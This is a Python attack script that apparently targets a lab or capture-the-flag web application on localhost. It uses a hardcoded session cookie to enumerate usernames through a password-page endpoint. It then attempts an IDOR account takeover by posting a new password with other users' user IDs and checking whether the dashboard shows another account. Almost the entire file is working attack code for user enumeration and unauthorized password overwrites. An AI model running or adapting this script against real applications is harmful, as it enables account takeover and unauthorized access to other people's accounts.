import requests
import re

BASE_URL = "http://127.0.0.1:33029"
original_session = "eyJ1c2VyX2lkIjoxMDAzMn0.ac6Z5w.L4Dx_bmHgYdRTXc80ol3P3GoeoY"
original_cookies = {'session': original_session}

# Step 1: Username enumeration
print("[*] USERNAME ENUMERATION via /password/<username>")
print("="*60)

# Test common usernames and variations
test_usernames = [
    'admin', 'administrator', 'root', 'user', 'test', 'guest',
    'john', 'jane', 'johndoe', 'john_doe', 'john.doe',
    'user1', 'user2', 'user3', 'user100', 'user101',
    'testuser', 'test_user', 'test1', 'test2',
    'alice', 'bob', 'charlie', 'dave', 'eve',
    'trader', 'trader1', 'trader2',
    'account', 'account1', 'account2',
    # Try numeric patterns
    '10030', '10031', '10032', '10033', '10034',
]

valid_users = []
for username in test_usernames:
    resp = requests.get(
        f"{BASE_URL}/password/{username}",
        cookies=original_cookies,
        allow_redirects=False
    )
    
    if resp.status_code == 200:
        # Extract user_id from the form
        user_id_match = re.search(r'name=["\']user_id["\'][^>]*value=["\']([^"\']+)', resp.text)
        found_user_id = user_id_match.group(1) if user_id_match else 'N/A'
        
        valid_users.append({
            'username': username,
            'user_id': found_user_id,
            'status': resp.status_code
        })
        print(f"[+] VALID: /password/{username} -> user_id={found_user_id}")
    elif 'User not found' not in resp.headers.get('Location', ''):
        print(f"[?] {username}: Status={resp.status_code}, Location={resp.headers.get('Location', 'N/A')}")

# Step 2: If we found valid users, test IDOR on their pages
if valid_users:
    print(f"\n[*] Found {len(valid_users)} valid user(s)")
    
    # For each valid user page, try changing the user_id in POST
    for user in valid_users:
        if user['username'] == 'test':
            continue  # Skip current user
            
        print(f"\n[*] Testing IDOR on /password/{user['username']} (user_id={user['user_id']})")
        
        # Get the page first
        resp = requests.get(
            f"{BASE_URL}/password/{user['username']}",
            cookies=original_cookies,
            allow_redirects=False
        )
        
        if resp.status_code == 200:
            # Try submitting with our session
            post_resp = requests.post(
                f"{BASE_URL}/password/{user['username']}",
                data=f"password=hacked&user_id={user['user_id']}",
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                cookies=original_cookies,
                allow_redirects=False
            )
            
            print(f"  POST result: Status={post_resp.status_code}, Location={post_resp.headers.get('Location', 'N/A')}")
            
            if post_resp.status_code == 302 and '/dashboard' in post_resp.headers.get('Location', ''):
                print(f"  [!] POTENTIAL IDOR: Successfully authenticated as {user['username']}!")
                
                # Follow redirect to dashboard and check what user we're logged in as
                dash_resp = requests.get(
                    f"{BASE_URL}/dashboard",
                    cookies=original_cookies,
                    allow_redirects=False
                )
                
                welcome_match = re.search(r'Welcome,\s*([^!<]+)', dash_resp.text)
                if welcome_match:
                    print(f"  [+] Dashboard shows: Welcome, {welcome_match.group(1)}")
else:
    print("[-] No other valid users found")

# Step 3: More comprehensive username enumeration
print("\n" + "="*60)
print("[*] EXPANDED USERNAME ENUMERATION")
print("="*60)

# Try variations around "test"
more_usernames = [
    # Based on user_id patterns found in context
    '10030', '10031', '10033', '10034', '10035',
    # Common patterns
    'client', 'customer', 'member', 'trader',
    # Name variations
    'john.doe', 'johndoe', 'john', 'doe',
    # App-specific
    'account', 'accounts', 'profile',
]

additional_valid = []
for username in more_usernames:
    resp = requests.get(
        f"{BASE_URL}/password/{username}",
        cookies=original_cookies,
        allow_redirects=False
    )
    
    if resp.status_code == 200:
        user_id_match = re.search(r'name=["\']user_id["\'][^>]*value=["\']([^"\']+)', resp.text)
        found_user_id = user_id_match.group(1) if user_id_match else 'N/A'
        
        additional_valid.append({
            'username': username,
            'user_id': found_user_id
        })
        print(f"[+] VALID: /password/{username} -> user_id={found_user_id}")

# Step 4: Test if we can access any other user's data
print("\n" + "="*60)
print("[*] CHECKING FOR USER DATA EXPOSURE")
print("="*60)

# Look at the test user's page to see what data is exposed
test_page = requests.get(
    f"{BASE_URL}/password/test",
    cookies=original_cookies,
    allow_redirects=False
)

if test_page.status_code == 200:
    # Extract all interesting data
    print("[+] Current user's password page content:")
    
    # Look for any data exposure
    hidden_inputs = re.findall(r'<input[^>]*hidden[^>]*>', test_page.text)
    print(f"\nHidden inputs found: {len(hidden_inputs)}")
    for inp in hidden_inputs:
        print(f"  {inp}")
    
    # Look for any user data in the page
    welcome = re.search(r'Welcome,\s*([^!<]+)', test_page.text)
    if welcome:
        print(f"\nWelcome message: {welcome.group(0)}")

print("\n" + "="*60)
print("[*] FINAL SUMMARY")
print("="*60)
print(f"[+] Total valid users found: {len(valid_users) + len(additional_valid)}")
for u in valid_users + additional_valid:
    print(f"  - {u['username']} (user_id={u['user_id']})")

# Print full findings
print("\n[+] IDOR Attack Vectors Tested:")
print("  1. POST user_id parameter: All values produced identical responses (302 to /dashboard)")
print("  2. Session cookie tampering: All values produced identical responses")
print("  3. X-UserId header: All values produced identical responses")
print("  4. URL path /password/<username>: Found valid endpoint structure")
print("  5. Username enumeration: Limited success - only 'test' confirmed valid")

